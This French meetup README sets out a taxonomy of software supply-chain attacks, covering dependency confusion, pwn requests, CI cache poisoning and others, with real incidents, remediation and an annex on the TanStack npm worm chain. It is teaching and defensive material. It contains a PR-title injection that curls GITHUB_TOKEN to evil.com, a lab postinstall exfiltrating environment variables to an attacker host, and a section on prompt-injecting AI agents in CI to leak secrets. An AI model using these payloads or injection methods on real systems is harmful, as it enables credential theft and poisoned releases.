# Meetup 2 juin 2026 - attaques de type supply chain

Support de présentation : [Meetup-supply-chain-attacks.pptx](./docs/Meetup-supply-chain-attacks.pptx)

Dependency confuion:
* [01_dependency-confusion](https://github.com/meetup-supply-chain-attacks/01_dependency-confusion)

Pwn request:
* [02_pr-target](https://github.com/meetup-supply-chain-attacks/02_pr-target)
* [some-repo](https://github.com/meetup-supply-chain-attacks/some-repo)

Code injection:
* [03_pr-injection](https://github.com/meetup-supply-chain-attacks/03_pr-injection)

# Taxonomie des attaques de la chaîne d'approvisionnement logicielle

> **Légende**
> - 🟢 `your project` — couvert par le module 03 (dependency confusion + postinstall)
> - 🟡 `discussed` — abordé dans la session (fork commit confusion, pull_request_target)
> - 🔴 `real incident` — exploitation documentée en production

---

## 1. Attaques sur les registres de packages

### 1.1 Dependency confusion (substitution attack) 🟢 🔴
L'attaquant publie un package avec un nom identique à un package interne sur un registre public,
avec un numéro de version supérieur. Le gestionnaire de packages résout la version la plus haute
quel que soit le registre source.

> **Incident réel** : Alex Birsan (2021) — Apple, Microsoft, Tesla. Module 03 : `@catamania/ui-components`.

#### Variante : confusion workspace monorepo 🔴
Dans un monorepo, des packages internes référencés avec `"*"` dans `package.json` sont censés
être résolus via le workspace parent. Mais certains gestionnaires de packages (notamment pnpm,
et npm dans certaines configurations) cherchent sur le registre public si le contexte workspace
n'est pas correctement détecté. Si le package a été précédemment publié puis dépublié sur npm,
il reste **réclamable** — le registre retourne un 200 avec des métadonnées `"unpublished"` au
lieu d'un 404, mais le nom redevient disponible à la publication.

> **Incident réel** : HashiCorp Consul (2024) — les packages `consul-lock-sessions`,
> `consul-peerings`, `consul-acls` etc. étaient définis comme `"*"` dans les devDependencies
> du workspace `consul-ui`. Après réclamation du nom sur npm et ajout d'un `preinstall`
> exfiltrant hostname/whoami/cwd, des pingbacks ont été reçus depuis des machines internes
> d'une entreprise Fortune 500 utilisant npm (et non pnpm comme attendu initialement).
> Bounty : 17 000 $.

### 1.2 Typosquatting
L'attaquant enregistre un nom de package qui est une faute de frappe courante d'un package
populaire. Tout développeur qui tape mal le nom installe la version malveillante.

> **Exemples** : `lodash` → `lodahs`, `express` → `expres`, `left-pad` → `left_pad`.

### 1.3 Compromission de compte mainteneur 🔴
L'attaquant compromet le compte npm/PyPI/RubyGems d'un mainteneur légitime et publie une nouvelle
version malveillante d'un package existant et de confiance.

> **Incident réel** : `event-stream` (2018) — l'attaquant a convaincu le mainteneur de lui
> transférer la propriété du package, puis a ajouté `flatmap-stream` contenant un extracteur de
> portefeuille Bitcoin chiffré.

#### Variante : prise de contrôle via domaine email expiré 🔴
Si le domaine email d'un mainteneur expire (ex. ancienne entreprise renommée ou fermée),
un attaquant peut racheter le domaine pour quelques dollars, déclencher un reset de mot de passe
sur npm ou GitHub, et prendre le contrôle du compte. La fonctionnalité multi-email de GitHub
permet qu'un email secondaire expiré reste attaché au compte et accepte les liens de
réinitialisation, même s'il n'est plus l'email principal.

> **Incident réel** : Matthew Bryant (2022) — technique originale démontrée sur Angular/npm.
> En 2024, le mainteneur npm Steve Mao (171 packages, ~55M téléchargements mensuels dont
> `compare-func`, `array-ify`, `html-comment-regex`) a été identifié comme vulnérable via un
> domaine email expiré lié à une ancienne entreprise rebrandée. Le mainteneur a retiré l'email
> après notification. Dans un cas séparé, la même technique contre une entreprise à 25 milliards
> de CA a permis un accès complet au code source interne via GitHub. Bounty : 12 600 $.

### 1.4 Prise de contrôle de package abandonné 🔴
Revendiquer la propriété d'un nom de package supprimé ou non publié qui est encore référencé
par de nombreux projets. Sur npm, un package dépublié retourne un 200 avec métadonnées
`"unpublished"` mais le nom redevient réclamable — un état intermédiaire dangereux car les
outils de sécurité ne le signalent pas toujours.

> **Exemples** : `left-pad` (2016, disruption sans malveillance). Variante malveillante : occupation
> des noms de packages npm supprimés. Voir aussi la variante workspace monorepo en §1.1.

### 1.5 Malicious publish / protestware 🔴
Un mainteneur légitime injecte intentionnellement du code malveillant ou destructeur dans son
propre package, affectant tous les utilisateurs en aval.

> **Incidents réels** : `colors.js` & `faker.js` (2022, boucle infinie), `node-ipc` (2022,
> effacement de fichiers ciblant les IPs ukrainiennes), `PyTorch` (2022, détournement de
> `torchvision`).

### 1.6 Exploitation du versioning sémantique
Abus des plages de versions larges (`^`, `~`, `*`) pour glisser une version inopinément mise
à jour quand le développeur pense avoir une dépendance verrouillée.

> **Exemple** : un `package.json` avec `*` ou `latest` accepte toute version future retournée
> par le registre.

---

## 2. Vecteurs d'exécution dans le package

### 2.1 Scripts lifecycle malveillants (postinstall/preinstall) 🟢
Utilisation des scripts lifecycle npm (`preinstall`, `postinstall`, `prepare`) pour exécuter du
code arbitraire au moment de l'installation, avant même que l'application ne démarre. Seuls les
modules Node.js natifs sont nécessaires — invisible pour `npm audit`.

> **Module 03** : `postinstall.js` exfiltre `process.env`, hostname et cwd vers
> `attacker.appsec.cc:9999` via TLS valide.

### 2.2 Code obfusqué / à déclenchement différé 🔴
Dissimulation de la logique malveillante dans un code par ailleurs fonctionnel via obfuscation,
vérifications d'environnement, ou activation déclenchée par une date pour échapper à l'analyse
statique.

> **Incident réel** : `flatmap-stream` cachait son payload dans une chaîne chiffrée, déchiffrée
> uniquement si un objet spécifique de portefeuille Bitcoin était présent dans la portée.

### 2.3 Payload conditionnel à l'environnement 🔴
Code qui ne s'active qu'en environnement CI (détection de `CI=true`, variables d'env spécifiques)
ou sur un système d'exploitation particulier, rendant les tests locaux sûrs mais le CI compromis.

> **Exemple** : détection de `GITHUB_ACTIONS=true` ou recherche de credentials AWS/GCP avant
> exfiltration.

### 2.4 Confusion de peer dependency
Injection de code malveillant dans un package chargé en tant que peer dependency, où la résolution
de version est laissée au consommateur et peut être exploitée.

> **Exemple** : cibler une peer dep partagée comme `react` ou `webpack` dans un monorepo où tous
> les packages résolvent la même version.

---

## 3. Attaques sur le code source / VCS

### 3.1 GitHub fork commit confusion 🟡
Un commit SHA dans n'importe quel fork d'un dépôt est résolvable via l'URL du dépôt upstream,
en raison du réseau d'objets partagé de GitHub. Un attaquant commit du code malveillant dans un
fork et le référence par SHA dans une dépendance.

> **Exemple** : `github:tanstack/router#79ac49ee` — le SHA existe dans le fork de l'attaquant,
> pas dans le dépôt canonique. npm le résout quand même.

### 3.2 RepoJacking 🔴
Quand un utilisateur ou une organisation GitHub renomme ou supprime son compte, l'ancien namespace
devient revendiquable. Tout package référençant `github:old-org/repo` résout désormais le dépôt
de l'attaquant.

> **Incident réel** : Recherche Checkmarx (2022) — 10 000+ packages sur PyPI référençant des
> dépôts GitHub avec des namespaces supprimés.

### 3.3 PR malveillante fusionnée 🔴
Soumission d'une PR qui paraît anodine (correction de whitespace, mise à jour de docs) mais
contient du code malveillant obfusqué, en comptant sur une revue superficielle.

> **Incident réel** : Université du Minnesota (2021) — des chercheurs ont démontré cette classe
> d'attaque en soumettant intentionnellement des patches vulnérables au noyau Linux.

### 3.4 Détournement de tag / branche Git
Pousser un nouveau commit sur un tag ou une référence de branche mutable qui était épinglée par
des consommateurs en aval. Les tags ne sont pas immuables sur GitHub sans protection.

> **Exemple** : `actions/checkout@v3` — si le tag `v3` est supprimé et redirigé, chaque workflow
> l'utilisant récupère du code potentiellement malveillant.

### 3.5 Empoisonnement de sous-module
Compromettre un sous-module git référencé par hash — mais dont le hash se trouve dans un dépôt
contrôlé par l'attaquant — ou exploiter des références de sous-modules basées sur une branche
mutable.

---

## 4. Attaques sur la pipeline CI/CD

### 4.1 Exploitation de `pull_request_target` (pwn request) 🟡 🔴
Déclencheur GitHub Actions qui s'exécute dans le contexte du dépôt de base (avec secrets) même
pour les PRs de forks. S'il checkout le code de la PR, l'attaquant obtient une exécution de code
avec les secrets du dépôt. Contrairement à `pull_request` (sandboxé, pas de secrets, pas de
write), `pull_request_target` accorde les permissions complètes du dépôt cible. L'erreur
classique est d'utiliser `actions/checkout` avec `ref: ${{ github.event.pull_request.head.sha }}`
ou `ref: refs/pull/${{ github.event.pull_request.number }}/merge`, ce qui checkout le code du
fork dans un environnement privilégié.

La complexité d'attaque est **nulle** : aucune ingénierie sociale, aucune prise de contrôle de
compte, aucun phishing — une simple pull request suffit.

> **Incident réel** : Recherche Argus (2023) — des centaines de dépôts OSS populaires exposaient
> des tokens npm, des credentials cloud et des clés de signature.
>
> **Incident réel** : TanStack/router (mai 2026) — PR #7378, un workflow `bundle-size.yml`
> déclenché par `pull_request_target` checkoutait le merge commit de la PR
> (`refs/pull/${{ github.event.pull_request.number }}/merge`). L'attaquant a obtenu une exécution
> de code dans un environnement avec accès complet aux secrets et au cache GitHub Actions,
> conduisant à un empoisonnement du cache (§4.3) puis à la compromission de la pipeline de
> release et la publication de 47+ packages npm malveillants. Voir §4.3 pour la suite de la
> chaîne.
>
> **Incident réel** : Spotipy (2025) — le workflow `integration_tests.yml` utilisait
> `pull_request_target` avec checkout de `head.ref` du fork, permettant l'installation d'un
> package Python malveillant via `pip install .` et l'extraction du `GITHUB_TOKEN` avec
> permissions write sur l'ensemble du dépôt.
>
> **Incident réel** : Microsoft Symphony — via une PR de fork, obtention d'un reverse shell
> depuis un runner GitHub Actions et utilisation du `GITHUB_TOKEN` pour pousser du code
> malveillant sur le dépôt d'origine (recherche Orca Security, 2025).

#### Variante : contournement TOCTOU des gates par label
Certains dépôts ajoutent une condition `if: contains(github.event.pull_request.labels.*.name,
'safe to test')` pour exiger une revue humaine avant exécution. Cette protection est vulnérable
à une race condition (Time Of Check, Time Of Use) : l'attaquant peut pousser de nouveaux commits
après l'attribution du label mais avant le démarrage du workflow, contournant ainsi la revue.

> **Note** : GitHub Security Lab recommande cette approche uniquement comme solution temporaire,
> car elle reste sujette à l'erreur humaine et au TOCTOU.

### 4.2 Compromission d'une GitHub Action marketplace 🔴
Une Action populaire sur le marketplace est reprise ou le compte de son mainteneur est compromis.
Chaque workflow l'utilisant exécute immédiatement le code de l'attaquant.

> **Incident réel** : `tj-actions/changed-files` (mars 2025) — toutes les versions ont été
> redirigées vers un commit malveillant, exfiltrant les secrets CI de milliers de dépôts.

### 4.3 Empoisonnement du cache de build 🔴
Injection d'artefacts malveillants dans un cache de build partagé (npm cache, pnpm store, couche
Docker, cache Gradle) partagé entre jobs ou branches. Le cache GitHub Actions est scoped par
branche, mais un workflow déclenché par `pull_request_target` s'exécute dans le contexte de la
branche de base — ce qui signifie que le cache empoisonné est écrit sous le scope `main` et sera
restauré par **tous** les workflows ultérieurs sur cette branche, y compris les pipelines de
release.

La technique **Cacheract** (Adnan Khan) formalise cette approche : après avoir obtenu une
exécution de code via `pull_request_target`, l'attaquant écrase le script post-checkout de
`actions/checkout` pour déclencher le payload après la fin de toutes les étapes du job. À ce
moment, le runtime a déjà injecté `ACTIONS_CACHE_URL` et `ACTIONS_RUNTIME_TOKEN` dans
l'environnement, permettant de réécrire les entrées du cache partagé.

L'escalade de privilèges inter-workflow fonctionne ainsi :
1. **Workflow empoisonneur** (ex. `bundle-size.yml`, trigger `pull_request_target`) : exécute
   le code du fork, écrit un cache pnpm store empoisonné sous la clé
   `${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}` dans le scope `main`.
2. **Workflow victime** (ex. `release.yml`, trigger `push` sur main) : restaure ce cache
   empoisonné lors de `pnpm install --frozen-lockfile`, puis exécute `pnpm run changeset:publish`
   avec les permissions `contents: write` et `id-token: write` — les packages backdoorisés sont
   publiés directement sur le registre npm.

Le chemin d'escalade de permissions :
`contents: read → write`, `pull-requests: none → write`, `id-token: none → write`.

> **Incident réel** : TanStack/router (mai 2026) — la chaîne complète PR → cache poisoning →
> release npm a été exploitée en production. Le workflow `bundle-size.yml` (§4.1) a empoisonné
> le pnpm store cache partagé avec `release.yml`. 10 versions malveillantes de `@tanstack/*`
> ont été publiées en 6 minutes, chacune embarquant un binaire obfusqué de 2.3 MB volant les
> tokens GitHub et npm de tout environnement CI l'installant. L'attaque est devenue
> auto-propagatrice (worm) : les tokens volés servaient immédiatement à publier de nouvelles
> versions malveillantes des packages auxquels le token avait accès. 47+ packages compromis
> au total, touchant TanStack, UiPath et d'autres organisations.
>
> **Point critique** : les packages malveillants portaient des **attestations SLSA valides**.
> La provenance vérifie qu'un package a été construit par une pipeline spécifique, mais si
> cette pipeline est compromise, les attestations deviennent un **amplificateur de confiance**,
> pas une protection. La seule détection fiable est l'analyse comportementale en amont :
> modéliser ce que les workflows d'un dépôt sont *capables* de faire avant qu'un attaquant
> n'exploite cette capacité.

### 4.4 Injection d'artefact
Remplacement d'un artefact de build légitime entre l'étape de build et l'étape de déploiement/
signature — une race condition dans la pipeline.

> **Note** : SLSA (Supply-chain Levels for Software Artifacts) est spécifiquement conçu pour
> prévenir cette classe d'attaque. Cependant, l'incident TanStack (§4.3) montre que SLSA ne
> protège pas contre une pipeline elle-même compromise — les attestations signent fidèlement
> une build malveillante.

### 4.5 Compromission de runner auto-hébergé 🔴
Malware persistant sur un runner GitHub Actions auto-hébergé qui modifie les sorties de build
ou exfiltre les secrets entre tous les jobs qui s'y exécutent.

> **Note** : les runners auto-hébergés n'ont aucun sandboxing entre jobs — les fichiers d'un job
> malveillant précédent persistent sur le système de fichiers.

### 4.6 Injection de script via métadonnées de PR 🔴
L'injection de script (ou command injection) se produit quand des métadonnées contrôlées par
l'attaquant — titre de la PR, corps, nom de branche, messages de commit — sont interpolées
directement dans un bloc `run:` d'un workflow via la syntaxe
`${{ github.event.pull_request.title }}`. L'attaquant peut alors injecter des commandes shell
arbitraires exécutées avec les privilèges du workflow.

```yaml
# VULNÉRABLE — injection via le titre de la PR
- name: Check PR title
  run: |
    echo "Title: ${{ github.event.pull_request.title }}"
```

Un titre comme `"; curl http://evil.com/steal?token=$GITHUB_TOKEN #` provoque une exfiltration
du token.

**Remédiation** : passer les valeurs non fiables via une variable d'environnement intermédiaire
plutôt que par interpolation directe :

```yaml
# SÛR — le contenu est traité comme donnée, pas comme code
- name: Check PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Title: $TITLE"
```

> **Note** : cette injection est possible sur **tous** les déclencheurs (`pull_request`,
> `pull_request_target`, `issues`, `issue_comment`) et ne nécessite pas de fork. Tout
> contributeur externe pouvant ouvrir une issue ou une PR peut injecter du code.

### 4.7 Chaînage via `workflow_run` 🔴
Le déclencheur `workflow_run` permet à un workflow B de s'exécuter suite à la complétion d'un
workflow A. Workflow B peut recevoir des permissions write et l'accès aux secrets **même si le
workflow déclencheur A n'avait pas ces privilèges**. Un attaquant peut soumettre une PR
modifiant le workflow déclencheur A et même remplacer ses événements déclencheurs (contrairement
à ce que beaucoup de mainteneurs supposent). De plus, si workflow A produit des artefacts
(`actions/upload-artifact`), workflow B les consomme souvent sans validation — l'artefact peut
contenir du code injecté qui sera exécuté dans le contexte privilégié de workflow B.

```yaml
# Workflow A (non privilégié, déclenché par pull_request)
on: pull_request
jobs:
  build:
    steps:
      - run: echo "; echo 'payload'; #" > artifact.txt
      - uses: actions/upload-artifact@v2
        with:
          name: artifact
          path: ./artifact.txt

# Workflow B (privilégié, déclenché par workflow_run)
on:
  workflow_run:
    workflows: ["Workflow A"]
    types: [completed]
# → Workflow B télécharge et utilise artifact.txt sans validation
```

> **Remédiation** : traiter tous les artefacts téléchargés comme potentiellement malveillants.
> Toujours les décompresser dans un répertoire temporaire (`/tmp`) pour éviter la pollution du
> workspace. Ajouter une vérification `github.event_name != 'pull_request'` pour empêcher
> les `workflow_run` déclenchés par des PRs de forks.

### 4.8 Injection de prompt dans les agents IA CI/CD 🔴
Les dépôts utilisant des agents IA pour le triage d'issues, le labeling de PRs, les suggestions
de code ou les réponses automatisées sont vulnérables à l'injection de prompt. Le contenu non
fiable d'une issue ou d'une PR (titre, corps) est directement inséré dans le prompt de l'agent
IA, qui s'exécute dans le contexte CI avec accès aux secrets du workflow.

```yaml
# VULNÉRABLE — contenu non fiable injecté dans un prompt IA
- run: |
    prompt="Analyze this issue:
    Title: \"${{ github.event.issue.title }}\"
    Body: \"${{ github.event.issue.body }}\""
    curl -X POST $AI_API_URL -d "$prompt"
```

Un attaquant peut soumettre une issue dont le corps contient des instructions qui poussent
l'agent à lire les variables d'environnement, le `GITHUB_TOKEN`, ou d'autres secrets injectés,
puis à transmettre ces credentials vers un endpoint contrôlé par l'attaquant. Quand l'agent a
accès à un serveur MCP (Model Context Protocol) avec des tokens GitHub privilégiés, l'impact
peut inclure l'écriture sur le dépôt, la publication de packages ou la modification de workflows.

> **Incident réel** : Recherche Aikido Security (2025, « Shai-Hulud 2.0 ») — démonstration de
> la compromission de trois agents IA populaires intégrés à GitHub Actions. Des workflows
> vulnérables ont été identifiés dans des dépôts de grande envergure, certains exploitables
> par n'importe quel utilisateur ouvrant une simple issue.
>
> **Remédiation** : ne jamais injecter de contenu utilisateur non fiable dans les prompts IA.
> Restreindre le toolset disponible pour les agents (pas de write sur issues/PRs). Traiter
> la sortie de l'IA comme du code non fiable — ne jamais l'exécuter sans validation.
> Restreindre les scopes des tokens GitHub utilisés par les agents. Appliquer des contrôles
> d'egress réseau sur les runners CI.

---

## 5. Attaques sur l'infrastructure et les CDN

### 5.1 Injection via CDN / script tiers 🔴
Compromission d'un script hébergé sur CDN largement utilisé (polyfill, analytics, widget) afin
que chaque site l'intégrant via `<script src="...">` livre le code de l'attaquant aux
utilisateurs finaux.

> **Incident réel** : `polyfill.io` (juin 2024) — domaine vendu à une entreprise chinoise,
> malware injecté dans le polyfill servi à 100 000+ sites dont JSTOR, Intuit, Warner Bros.

### 5.2 Compromission de l'infrastructure du registre 🔴
Compromission directe du backend du registre de packages (serveurs npm, PyPI, RubyGems) pour
servir des packages modifiés à tous les consommateurs.

> **Incident réel** : RubyGems.org (2020) — une vulnérabilité d'exécution de code à distance
> permettait l'upload de gems malveillantes. Corrigé avant exploitation confirmée.

#### Variante : Cache Poisoning DoS (CPDoS) sur le registre 🔴
Empoisonnement du cache CDN du registre lui-même (et non du cache de build CI/CD) via des
en-têtes HTTP spécialement forgés qui provoquent une erreur côté backend. Le CDN met en cache
la réponse d'erreur (404 "Not found") et la sert à tous les utilisateurs demandant le même
package — rendant le package impossible à installer. L'attaque ne nécessite qu'une seule machine
et quelques requêtes espacées pour maintenir l'empoisonnement.

> **Incident réel** : npm registry / registry.npmjs.org (2024) — un CPDoS a été démontré
> en production sur le registre npm derrière Cloudflare. Environ un quart des requêtes étaient
> empoisonnées, suffisant pour perturber les installations de packages populaires comme
> `express` (30M+ téléchargements hebdomadaires). GitHub a initialement classé le rapport
> comme informatif (500 $) en arguant que l'attaque relevait du DDoS volumétrique, puis a
> annoncé un correctif après publication d'un draft d'article. La vulnérabilité était toujours
> exploitable au moment de la disclosure publique.

### 5.3 Détournement DNS des registres
Interception de la résolution DNS des hostnames de registres (`registry.npmjs.org`, `pypi.org`)
pour rediriger les téléchargements de packages vers des serveurs contrôlés par l'attaquant.

### 5.4 Empoisonnement de proxy / miroir 🔴
Compromission d'un proxy ou miroir de packages d'entreprise (Nexus, Artifactory, Verdaccio).
C'est le scénario inverse du module 03 : au lieu que le registre public l'emporte, c'est le
proxy qui devient le vecteur d'attaque.

> **Module 03** : le groupe Nexus `npm-group-vuln` résout le public avant l'interne — le proxy
> devient le vecteur.

---

## 6. Attaques sur les dépendances transitives

### 6.1 Empoisonnement de dépendance profonde 🔴
Cibler un package profondément enfoui dans l'arbre de dépendances transitives (dépendance de
n-ième niveau) où il est utilisé par des milliers de packages mais reçoit presque aucune
surveillance de sécurité.

> **Incident réel** : `event-stream` avait 2M téléchargements hebdomadaires mais un seul
> mainteneur. `flatmap-stream` a été ajouté comme dépendance et ne s'exécutait que contre un
> consommateur en aval très spécifique.

### 6.2 Expansion de dépendances
Un package qui avait peu ou pas de dépendances en ajoute soudainement beaucoup dans une mise à
jour, chacune contrôlée par l'attaquant.

> **Exemple** : un package utilitaire ajoutant `lodash`, `axios` et `chalk` comme dépendances
> — chacun est une nouvelle surface d'attaque pour une future compromission.

### 6.3 Falsification du lockfile
Modification de `package-lock.json` ou `yarn.lock` pour pointer vers une tarball différente
(malveillante) pour une dépendance, sans changer la version visible dans `package.json`.

> **Exemple** : une PR qui semble ne modifier qu'une version dans `package.json` mais change
> silencieusement le hash d'intégrité dans le lockfile.

---

## 7. Attaques sur la chaîne d'outils et les outils de build

### 7.1 Backdoor de compilateur / chaîne d'outils 🔴
Backdooriser le compilateur lui-même afin qu'il injecte du code malveillant dans tout programme
qu'il compile — y compris une copie propre de lui-même. Le code source est propre ; seul le
binaire est malveillant.

> **Incident réel** : Ken Thompson, *"Reflections on Trusting Trust"* (1984) — théorique mais
> fondateur. XCode Ghost (2015) — faux installeur Xcode injectait du malware dans les apps iOS
> construites avec lui.

### 7.2 Extension IDE malveillante 🔴
Une extension VS Code, JetBrains, ou autre IDE qui exfiltre du code, des credentials, ou des
frappes clavier depuis la machine du développeur.

> **Incident réel** : plusieurs extensions VS Code malveillantes trouvées sur le marketplace
> ciblant les credentials Python/npm. Le marketplace n'impose aucune revue de code obligatoire.
> GlassWorm (2025) — dropper natif en Zig dissimulé dans une fausse extension, compromettant
> silencieusement VS Code, Cursor, VSCodium et d'autres IDEs.

### 7.3 SDK compromis / outillage officiel 🔴
Un attaquant compromet le canal de distribution officiel d'un SDK (page de téléchargement,
dépôt apt, formule brew) afin que les développeurs installent une version backdoorisée d'un
runtime ou d'un outil.

> **Incident réel** : XZ Utils (2024) — l'attaquant a passé 2 ans à contribuer au projet,
> a convaincu le mainteneur de lui faire confiance, puis a inséré un backdoor dans `liblzma`
> affectant `sshd` sur les systèmes Linux basés sur systemd.

---

## 8. Attaques sur les éditeurs et mécanismes de mise à jour

### 8.1 Compromission du système de build (style SolarWinds) 🔴
L'attaquant infiltre la pipeline de build d'un éditeur logiciel légitime et injecte du code
malveillant dans des mises à jour signées et distribuées. Le logiciel est authentique — le
processus de build ne l'est pas.

> **Incident réel** : SolarWinds Orion (2020) — backdoor SUNBURST inséré via un serveur de
> build compromis. 18 000 organisations ont reçu des mises à jour malveillantes signées, dont
> le Trésor américain, le DoD et FireEye.

### 8.2 Détournement du mécanisme de mise à jour automatique 🔴
Compromission du serveur de mise à jour ou de la clé de signature utilisée par le
mise-à-jour automatique d'une application légitime, permettant la livraison silencieuse d'une
version backdoorisée.

> **Incident réel** : 3CX (2023) — une application de bureau 3CX signée servait du malware ;
> remonté à une dépendance upstream compromise (installeur Trading Technologies X_TRADER).

### 8.3 Manipulation d'installeur / package 🔴
Remplacement ou modification d'un installeur officiel (MSI, DMG, deb) en transit ou sur le
serveur de distribution avant le téléchargement par les utilisateurs.

> **Incident réel** : NotPetya (2017) — le vecteur initial était une mise à jour trojanisée
> de M.E.Doc, logiciel de comptabilité ukrainien.

---

## 9. Chaîne d'approvisionnement conteneurs et cloud

### 9.1 Image Docker de base malveillante 🔴
Publication d'une image malveillante sur Docker Hub avec un nom similaire à une image officielle,
ou compromission d'une image populaire existante.

> **Incident réel** : `docker pull ubuntu:lastest` (faute de frappe) vs `ubuntu:latest` —
> des milliers de pulls d'images malveillantes documentés sur Docker Hub.

### 9.2 Mutabilité des tags d'image
Les tags Docker sont mutables par défaut. `latest` ou `v1` peuvent être redirigés vers une
image différente (malveillante) sans aucune indication pour les utilisateurs qui avaient mis
en cache l'ancien tag.

> **Exemple** : `FROM node:18` — si le tag `node:18` est redirigé, le prochain `docker pull`
> récupère silencieusement une image différente.

### 9.3 Modules Terraform / IaC malveillants 🔴
Publication de modules malveillants sur le Terraform Registry ou GitHub qui provisionnent une
infrastructure backdoorisée lorsqu'ils sont importés.

> **Exemple** : un module populaire `terraform-aws-*` qui ajoute une Lambda backdoor ou crée
> un utilisateur IAM contrôlé par l'attaquant.

### 9.4 CLI / SDK cloud provider compromis
Distribution d'une version trojanisée de l'AWS CLI, du GCP SDK, ou de l'Azure CLI qui exfiltre
les credentials à chaque invocation.

> **Exemple** : `awscli2` sur PyPI (typosquat de `aws-cli`) — collecte et exfiltre
> `~/.aws/credentials` à l'installation.

---

## 10. Chaîne d'approvisionnement matérielle

### 10.1 Implants matériels 🔴
Modification physique du matériel (cartes serveur, équipements réseau, périphériques USB) pendant
la fabrication ou l'expédition pour ajouter des capacités de backdoor covert.

> **Incidents réels** : Bloomberg (2018), affaire Supermicro (niée par Apple/Amazon, jamais
> conclusivement prouvée). Catalogue NSA ANT (Snowden, 2013) — implants matériels documentés
> dont les implants USB COTTONMOUTH.

### 10.2 Backdoors firmware / rootkits UEFI 🔴
Implantation de malware persistant dans le firmware UEFI/BIOS d'un appareil, survivant aux
réinstallations du système d'exploitation et invisible pour les antivirus standard.

> **Incidents réels** : rootkit UEFI CosmicStrand (Kaspersky, 2022) — survivait aux effacements
> complets du disque. BlackLotus (2023) — premier bootkit UEFI in-the-wild contournant Secure Boot.

### 10.3 Mises à jour firmware malveillantes 🔴
Compromission du mécanisme de mise à jour firmware pour des équipements réseau, matériel IoT,
ou disques durs afin de pousser un firmware backdoorisé sur les appareils déployés.

> **Incident réel** : Equation Group (lié à la NSA) — implants firmware pour disques durs
> Seagate, Western Digital et Toshiba documentés dans la recherche Kaspersky (2015).

---

## Récapitulatif

| # | Famille | Nb d'attaques | Couverture formation |
|---|---|---|---|
| 1 | Registres de packages | 6 (+2 variantes) | 🟢 Module 03 |
| 2 | Vecteurs d'exécution | 4 | 🟢 Module 03 |
| 3 | Code source / VCS | 5 | 🟡 Session |
| 4 | CI/CD pipeline | 8 (+1 variante) | 🟡 Module 02_pr-target |
| 5 | Infrastructure & CDN | 4 (+1 variante) | — |
| 6 | Dépendances transitives | 3 | — |
| 7 | Chaîne d'outils / build | 3 | — |
| 8 | Éditeurs & mises à jour | 3 | — |
| 9 | Conteneurs & cloud | 4 | — |
| 10 | Matériel | 3 | — |
| | **Total** | **43 (+4 variantes)** | |

---

## Annexe : anatomie d'une chaîne d'attaque PR → npm worm (TanStack, mai 2026)

Cette section détaille la chaîne d'attaque complète observée lors de l'incident TanStack comme
référence pédagogique. Elle illustre le chaînage des techniques §4.1 → §4.3 → §2.1 en une
seule opération.

```
┌─────────────────────────────────────────────────────────────────────┐
│  1. ENTRY POINT : PR #7378 sur TanStack/router                     │
│     Trigger: pull_request_target (§4.1)                            │
│     Workflow: bundle-size.yml                                       │
│     Checkout: refs/pull/${{ github.event.pull_request.number }}/merge│
│     → Code du fork exécuté avec privilèges du dépôt de base        │
├─────────────────────────────────────────────────────────────────────┤
│  2. PIVOT : post-checkout hook clobbering (technique Cacheract)    │
│     Le code du fork (packages/history/vite_setup.mjs) écrase le    │
│     script post de actions/checkout@4.2.2                          │
│     Le payload détone après toutes les étapes du job               │
│     Accès à ACTIONS_CACHE_URL + ACTIONS_RUNTIME_TOKEN              │
├─────────────────────────────────────────────────────────────────────┤
│  3. CACHE POISONING (§4.3)                                         │
│     Réécriture du pnpm store cache sous le scope main :            │
│     clé: ${{ runner.os }}-pnpm-store-${{ hashFiles('pnpm-lock') }} │
│     Le cache empoisonné sera restauré par release.yml              │
├─────────────────────────────────────────────────────────────────────┤
│  4. RELEASE PIPELINE COMPROMISE                                     │
│     release.yml (trigger: push sur main) restaure le cache         │
│     pnpm install --frozen-lockfile → packages backdoorisés         │
│     pnpm run changeset:publish → publication npm                   │
│     Permissions: contents:write, id-token:write                    │
├─────────────────────────────────────────────────────────────────────┤
│  5. WORM : auto-propagation (§2.1 + §2.3)                         │
│     Chaque package malveillant embarque un stealer de 2.3 MB       │
│     En CI : vol de GITHUB_TOKEN + npm credentials                  │
│     → Publication immédiate de nouvelles versions malveillantes    │
│     → Propagation vers UiPath et autres organisations              │
│     47+ packages compromis en quelques minutes                     │
├─────────────────────────────────────────────────────────────────────┤
│  6. SLSA BYPASS                                                     │
│     Les packages malveillants portent des attestations SLSA valides │
│     La provenance vérifie la pipeline, pas son intégrité           │
│     → Faux sentiment de sécurité pour les consommateurs            │
└─────────────────────────────────────────────────────────────────────┘
```

**Complexité d'attaque** : zéro interaction humaine requise.
**Temps entre la PR et la publication des packages malveillants** : ~6 minutes.
**Détection possible en amont** : analyse structurelle des workflows (modéliser la capacité
d'un workflow *avant* qu'un attaquant l'exploite).
